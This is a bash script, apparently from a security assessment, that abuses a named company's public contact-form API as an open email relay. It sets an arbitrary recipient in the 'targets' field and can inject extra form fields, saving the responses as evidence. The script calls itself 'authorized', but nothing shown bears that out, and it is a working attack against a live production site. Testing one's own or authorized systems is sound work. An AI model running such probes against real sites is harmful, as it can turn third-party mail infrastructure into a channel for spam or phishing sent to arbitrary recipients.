#!/bin/bash
# Independent verification of open email relay on POST https://www.infinitycapital.bh/api/send
# $1 = label, $2 = recipient address, $3 = extra -F field (optional)
LBL="$1"; R="$2"; X3="$3"
OUT=/work/evidence/verify
echo "########## $LBL ##########"
echo "recipient: $R"
if [ -n "$X3" ]; then
  EXTRA=(-F "$X3")
else
  EXTRA=()
fi
curl -sS --http2 -o "$OUT/resp_$LBL.json" -D "$OUT/resp_$LBL.hdr" \
  --trace-ascii "$OUT/trace_$LBL.txt" \
  -X POST 'https://www.infinitycapital.bh/api/send' \
  -H 'Accept: application/json' \
  -H 'User-Agent: Mozilla/5.0 (authorized security verification)' \
  -F 'fname=Independent' -F 'lname=Verifier' -F 'areacode=+973' -F 'tel=3600000' \
  -F 'cname=RelayVerify' -F "subject=Security verification $LBL" \
  -F "msg=Authorized security verification probe $LBL - no reply expected" -F 'check=0' \
  -F "targets=$R" "${EXTRA[@]}" --max-time 45
echo "--- STATUS ---"; head -1 "$OUT/resp_$LBL.hdr"
echo "--- BODY ---"; cat "$OUT/resp_$LBL.json"; echo; echo
